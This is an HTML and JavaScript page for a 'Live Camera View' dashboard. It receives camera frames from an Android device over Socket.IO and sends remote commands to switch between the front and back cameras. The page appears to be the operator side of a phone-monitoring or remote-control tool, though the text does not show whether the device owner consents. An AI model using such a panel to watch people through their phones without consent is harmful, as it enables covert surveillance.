<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Camera View</title>
    <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #000;
            color: #fff;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh;
            font-family: 'Segoe UI', sans-serif;
            overflow: hidden;
        }

        /* Video Container */
        #camContainer {
            position: relative;
            width: 100%; max-width: 500px;
            aspect-ratio: 9/16;
            background: #111;
            border: 2px solid #333;
            border-radius: 20px;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(0, 243, 255, 0.15);
        }

        /* Image Element (Stream) */
        #camStream {
            width: 100%; height: 100%;
            object-fit: cover;
            display: none; 
            transform: rotate(90deg); /* Adjust if needed based on phone orientation */
        }

        /* Loading / Error State */
        .status-msg {
            text-align: center;
            display: flex; flex-direction: column; align-items: center;
            gap: 10px;
            z-index: 5;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #00f3ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* Top Bar (Back Button) */
        .top-bar {
            position: absolute; top: 20px; left: 20px; z-index: 100;
        }
        .back-btn {
            background: rgba(0,0,0,0.6);
            padding: 10px 15px; border-radius: 30px;
            color: #fff; text-decoration: none;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.2);
            font-size: 0.9rem;
            display: flex; align-items: center; gap: 8px;
        }

        /* Bottom Controls (Switch Camera) */
        .controls-bar {
            position: absolute; bottom: 20px;
            display: flex; gap: 15px;
            z-index: 100;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 20px;
            border-radius: 40px;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255,255,255,0.1);
        }

        .cam-btn {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 10px;
            border-radius: 50%;
            transition: 0.2s;
            width: 50px; height: 50px;
            display: flex; align-items: center; justify-content: center;
        }
        .cam-btn:hover { background: rgba(255, 255, 255, 0.2); }
        .cam-btn:active { transform: scale(0.9); }
        
        .cam-btn.active { color: #00f3ff; text-shadow: 0 0 10px #00f3ff; }

    </style>
</head>
<body>

    <div class="top-bar">
        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Dashboard</a>
    </div>

    <div id="camContainer">
        <img id="camStream" src="" alt="Live Feed">
        
        <div id="statusBox" class="status-msg">
            <div class="spinner"></div>
            <h3 id="statusText">Connecting...</h3>
            <small style="color: #aaa; font-size: 0.8rem;" id="debugInfo">Waiting for ID...</small>
        </div>

        <div class="controls-bar">
            <button class="cam-btn" onclick="switchCamera('CAM_FRONT')" title="Front Camera">
                <i class="fa-solid fa-user"></i>
            </button>
            
            <button class="cam-btn" onclick="stopCam()" title="Stop / Refresh" style="color: #ff4444;">
                <i class="fa-solid fa-stop"></i>
            </button>

            <button class="cam-btn" onclick="switchCamera('CAM_BACK')" title="Back Camera">
                <i class="fa-solid fa-camera"></i>
            </button>
        </div>
    </div>

    <script>
        const API_BASE = 'https://child-v9no.onrender.com'; 
        
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');

        const imgElement = document.getElementById('camStream');
        const statusBox = document.getElementById('statusBox');
        const statusText = document.getElementById('statusText');
        const debugInfo = document.getElementById('debugInfo');

        if (!DEVICE_ID) {
            statusText.innerText = "Error: No Device ID";
            document.querySelector('.spinner').style.display = 'none';
        } else {
            startStreamListener();
        }

        function startStreamListener() {
            debugInfo.innerText = `Device: ${DEVICE_ID}`;
            const socket = io(API_BASE);

            socket.on('connect', () => {
                console.log("Connected to Server");
                socket.emit('join-web', DEVICE_ID);
                debugInfo.innerText = "Connected. Waiting for video...";
            });

            // Receive Image Data
            socket.on('cam-image', (data) => {
                if(data && data.image) {
                    statusBox.style.display = 'none';
                    imgElement.style.display = 'block';
                    imgElement.src = "data:image/jpeg;base64," + data.image;
                }
            });

            socket.on('disconnect', () => {
                statusText.innerText = "Disconnected";
            });
        }

        // ðŸ”¥ Function to Switch Camera
        function switchCamera(command) {
            if(!DEVICE_ID) return;

            // UI Feedback
            imgElement.style.display = 'none';
            statusBox.style.display = 'flex';
            statusText.innerText = command === 'CAM_FRONT' ? "Switching to Front..." : "Switching to Back...";
            
            // Send Command to Android
            fetch(`${API_BASE}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: command })
            })
            .then(res => console.log("Camera Switch Sent: " + command))
            .catch(err => console.error("Error switching", err));
        }

        function stopCam() {
             location.reload(); // Simple refresh for now to restart connection
        }
    </script>
</body>
</html>
